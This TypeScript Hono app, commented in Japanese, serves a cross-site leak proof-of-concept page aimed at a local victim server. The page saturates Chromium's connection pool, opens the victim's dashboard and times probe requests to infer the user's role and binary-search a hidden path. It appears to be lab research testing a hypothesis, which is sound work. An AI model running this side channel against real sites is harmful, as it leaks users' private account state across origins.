import { Hono } from "hono";

const attackApp = new Hono();

const VICTIM = "http://localhost:3001";
const POOL_SIZE = 6; // Chromiumの同一オリジン接続上限

/**
 * XS-Leak PoC: パスベースの辞書順タイミング差を観測する
 *
 * 仮説：
 *   サブドメインではなく、同一ホスト上の異なるパスでも
 *   connection poolの競合によるタイミング差で
 *   リダイレクト先のパスを推測できるか？
 *
 * オラクルの原理：
 *   Chromiumはconnection poolが満杯のとき、pending requestを
 *   ホスト名の辞書順でキューイングする（元論文の観察）。
 *   パスはURLの一部なので、同一ホストへの複数リクエストが
 *   競合する場合にパスの辞書順が処理順に影響するか検証する。
 */
attackApp.get("/", (c) => {
  return c.html(/* html */ `<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>XS-Leak Path Oracle PoC</title>
  <style>
    body { font-family: monospace; background: #0d0d0d; color: #00ff88; padding: 20px; }
    h1 { color: #ff6600; }
    #log { white-space: pre-wrap; border: 1px solid #333; padding: 10px; min-height: 200px; max-height: 500px; overflow-y: auto; }
    button { background: #ff6600; color: #000; border: none; padding: 8px 16px; cursor: pointer; font-size: 14px; margin: 4px; }
    .result { color: #ffff00; font-weight: bold; font-size: 1.2em; }
    .warn { color: #ff4444; }
    .info { color: #888; }
  </style>
</head>
<body>
  <h1>XS-Leak: Path Oracle PoC</h1>
  <p>仮説検証: サブドメインではなくパスベースでも辞書順タイミング差が観測できるか</p>

  <button onclick="runCalibration()">① キャリブレーション（閾値測定）</button>
  <button onclick="runOracle()">② オラクル実行（admin/user 判定）</button>
  <button onclick="runBinarySearch()">③ バイナリサーチ（パス推測）</button>
  <button onclick="clearLog()">ログクリア</button>

  <div id="log"></div>

  <script>
    const VICTIM = "${VICTIM}";
    const POOL_SIZE = ${POOL_SIZE};
    const log = (msg, cls = "") => {
      const el = document.getElementById("log");
      const line = cls ? \`<span class="\${cls}">\${msg}</span>\\n\` : msg + "\\n";
      el.innerHTML += line;
      el.scrollTop = el.scrollHeight;
    };
    const clearLog = () => { document.getElementById("log").innerHTML = ""; };
    const sleep = (ms) => new Promise(r => setTimeout(r, ms));

    // ---- Connection Pool ユーティリティ ----

    /**
     * プールを POOL_SIZE-1 本埋める。
     * 返り値は AbortController の配列（解放用）。
     */
    async function fillPool(holdMs = 3000) {
      const controllers = [];
      const promises = [];
      for (let i = 0; i < POOL_SIZE - 1; i++) {
        const ac = new AbortController();
        controllers.push(ac);
        promises.push(
          fetch(\`\${VICTIM}/sleep/\${holdMs}?slot=\${i}\`, {
            signal: ac.signal,
            mode: "no-cors",
          }).catch(() => {})
        );
      }
      // 全接続が確立されるまで少し待つ
      await sleep(300);
      log(\`  [pool] \${POOL_SIZE - 1}本のコネクションを確保\`, "info");
      return { controllers, promises };
    }

    /** プールを解放する */
    function releasePool(controllers) {
      controllers.forEach(ac => ac.abort());
    }

    // ---- タイミング計測 ----

    /**
     * 指定パスへの fetch 所要時間を計測する。
     * プールが1本しか空いていないとき、
     * victim の内部 fetch と競合する。
     */
    async function measurePath(path) {
      const start = performance.now();
      await fetch(\`\${VICTIM}\${path}\`, { mode: "no-cors", method: "HEAD" }).catch(() => {});
      return performance.now() - start;
    }

    // ---- Step 1: キャリブレーション ----

    async function runCalibration() {
      log("=== キャリブレーション開始 ===");
      log("プールを埋めずにベースライン計測...");

      const SAMPLES = 10;
      const paths = ["/probe/aaaaa", "/probe/zzzzz", "/internal/admin/dashboard", "/internal/user/dashboard"];

      for (const path of paths) {
        const times = [];
        for (let i = 0; i < SAMPLES; i++) {
          const t = await measurePath(path);
          times.push(t);
          await sleep(100);
        }
        const avg = (times.reduce((a,b)=>a+b,0) / SAMPLES).toFixed(1);
        const min = Math.min(...times).toFixed(1);
        const max = Math.max(...times).toFixed(1);
        log(\`  \${path}: avg=\${avg}ms min=\${min}ms max=\${max}ms\`);
      }

      log("\\nプールを埋めた状態で計測...");
      const { controllers } = await fillPool(5000);
      await sleep(200);

      for (const path of paths) {
        const t = await measurePath(path);
        log(\`  \${path} (pool満杯): \${t.toFixed(1)}ms\`);
      }

      releasePool(controllers);
      log("キャリブレーション完了\\n");
    }

    // ---- Step 2: オラクル（admin vs user 判定） ----

    /**
     * 核心部分。
     *
     * 被害者が /dashboard にアクセスすると
     *   admin → /internal/admin/dashboard
     *   user  → /internal/user/dashboard
     * にリダイレクトされる。
     *
     * 辞書順: /internal/admin/... < /internal/user/...
     *
     * 攻撃者は /internal/admin/dashboard への probe を投げ、
     * - 被害者の内部リクエストが "admin" なら同じパスへの競合 → 遅い
     * - 被害者の内部リクエストが "user" なら admin が先に処理される → 速い
     * という差を観測する（仮説）。
     *
     * ※ これはサブドメイン版と同じオラクルをパスに適用したもの。
     *    実際に差が出るかは検証次第。
     */
    async function singleOracleRun(guessPath) {
      const { controllers } = await fillPool(4000);
      await sleep(100);

      // 被害者のページ遷移をトリガー（内部 fetch を発火させる）
      const victimWin = window.open(\`\${VICTIM}/dashboard\`, "_blank");
      await sleep(100);

      // 自分の probe を投げてタイミング計測
      const t = await measurePath(guessPath);

      releasePool(controllers);
      if (victimWin) victimWin.close();

      return t;
    }

    async function runOracle() {
      log("=== オラクル実行 ===");
      log("VICTIM /dashboard にアクセスし、内部リダイレクト先を推測");
      log("probe: /internal/admin/dashboard vs /internal/user/dashboard\\n");

      const TRIALS = 5;
      const adminTimes = [];
      const userTimes = [];

      for (let i = 0; i < TRIALS; i++) {
        log(\`試行 \${i+1}/\${TRIALS}...\`);
        const tAdmin = await singleOracleRun("/internal/admin/dashboard");
        await sleep(500);
        const tUser = await singleOracleRun("/internal/user/dashboard");
        await sleep(500);

        adminTimes.push(tAdmin);
        userTimes.push(tUser);
        log(\`  admin probe: \${tAdmin.toFixed(1)}ms  user probe: \${tUser.toFixed(1)}ms\`);
      }

      const avgAdmin = adminTimes.reduce((a,b)=>a+b,0) / TRIALS;
      const avgUser  = userTimes.reduce((a,b)=>a+b,0) / TRIALS;

      log(\`\\n平均: admin=\${avgAdmin.toFixed(1)}ms  user=\${avgUser.toFixed(1)}ms\`);

      const diff = Math.abs(avgAdmin - avgUser);
      if (diff < 20) {
        log("差異が小さすぎる（< 20ms）。パスベースでは辞書順効果が出ない可能性あり。", "warn");
      } else if (avgAdmin > avgUser) {
        log("→ admin probe が遅い = 被害者も admin パスにアクセスしている可能性", "result");
        log("  ユーザーは ADMIN と推定", "result");
      } else {
        log("→ user probe が遅い = 被害者も user パスにアクセスしている可能性", "result");
        log("  ユーザーは USER と推定", "result");
      }
      log("");
    }

    // ---- Step 3: バイナリサーチ（パス探索） ----

    /**
     * 対象パスの不明部分をバイナリサーチで特定する。
     * ここでは /internal/{role}/dashboard の {role} を探す。
     *
     * オラクル: probe パスと victim のパスを競わせ、
     * probe が速ければ probe < victim（辞書順）。
     */
    async function pathOracle(probePath, threshold) {
      const { controllers } = await fillPool(4000);
      await sleep(100);

      const victimWin = window.open(\`\${VICTIM}/dashboard\`, "_blank");
      await sleep(100);

      const t = await measurePath(probePath);

      releasePool(controllers);
      if (victimWin) victimWin.close();
      await sleep(300);

      log(\`  probe \${probePath}: \${t.toFixed(1)}ms (threshold=\${threshold})\`, "info");

      // 速い（< threshold）→ probe がターゲットより辞書順で前
      return t < threshold;
    }

    async function runBinarySearch() {
      log("=== バイナリサーチ（パス探索）===");
      log("ターゲット: /internal/{???}/dashboard の ??? を推測\\n");

      // まず閾値を計測
      log("閾値計測中...");
      const baseTimes = [];
      for (let i = 0; i < 5; i++) {
        const t = await measurePath("/probe/mmm");
        baseTimes.push(t);
        await sleep(200);
      }
      const threshold = Math.max(...baseTimes) * 1.5;
      log(\`閾値: \${threshold.toFixed(1)}ms\\n\`);

      // バイナリサーチ
      // /internal/ に続く部分を探す（a〜z）
      const charset = "abcdefghijklmnopqrstuvwxyz";
      let result = "";
      let maxLen = 8; // 最大探索長

      log("バイナリサーチ開始...");

      for (let pos = 0; pos < maxLen; pos++) {
        let lo = 0, hi = charset.length - 1;

        while (lo <= hi) {
          const mid = Math.floor((lo + hi) / 2);
          const guess = result + charset[mid];
          const probePath = \`/internal/\${guess}\`;

          const isLower = await pathOracle(probePath, threshold);

          if (isLower) {
            // probe < victim → 実際の値は charset[mid] より後
            lo = mid + 1;
          } else {
            hi = mid - 1;
          }
        }

        if (lo < charset.length) {
          result += charset[lo];
          log(\`  pos[\${pos}]: '\${result}'\`);
        }

        // 終端チェック（/internal/{result}/dashboard が存在するか）
        const checkT = await measurePath(\`/internal/\${result}/dashboard\`);
        if (checkT < 200) { // 存在すれば速い
          log(\`\\n推測結果: /internal/\${result}/dashboard\`, "result");
          break;
        }
      }
    }
  </script>
</body>
</html>`);
});

export default attackApp;